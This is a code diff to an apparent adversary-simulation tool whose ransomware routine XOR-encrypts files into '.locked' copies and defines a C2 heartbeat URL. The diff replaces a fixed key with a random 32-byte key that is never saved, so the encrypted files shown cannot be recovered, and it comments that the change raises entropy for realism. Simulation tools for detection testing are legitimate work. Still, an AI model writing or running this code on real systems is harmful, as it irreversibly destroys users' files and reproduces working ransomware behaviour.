@@ -1,3 +1,4 @@
+import os
 import time
 import urllib.request
 import urllib.error
@@ -12,9 +13,13 @@ class AdversarySimulator:
         self.c2_url = f"http://{c2_host}:{c2_port}/api/v1/heartbeat"
         self.threads = []
         
-    def _xor_cipher(self, data: bytes, key: int = 42) -> bytes:
-        """Simple XOR cipher to simulate encryption."""
-        return bytes(b ^ key for b in data)
+    def _xor_cipher(self, data: bytes) -> bytes:
+        """Realistic XOR cipher using a 32-byte key stream to increase file entropy."""
+        key = os.urandom(32)
+        encrypted = bytearray(len(data))
+        for i in range(len(data)):
+            encrypted[i] = data[i] ^ key[i % len(key)]
+        return bytes(encrypted)
 
     def simulate_ransomware(self, stop_event: threading.Event):
         """Simulates ransomware by finding files and XOR-ing them."""
@@ -35,7 +40,8 @@ class AdversarySimulator:
                 
             if not files_to_encrypt:
                 # No more targets, wait a bit and check again
-                time.sleep(2)
+                print("[Red] No more files to encrypt. Ransomware simulation idle.")
+                time.sleep(10)
                 continue
                 
             # 2. Encrypt targets
@@ -49,7 +55,7 @@ class AdversarySimulator:
                     with safe_open(target, 'rb') as f:
                         plaintext = f.read()
                         
-                    # Encrypt
+                    # Encrypt with pseudo-random stream to increase entropy
                     ciphertext = self._xor_cipher(plaintext)
                     
                     # Write .locked
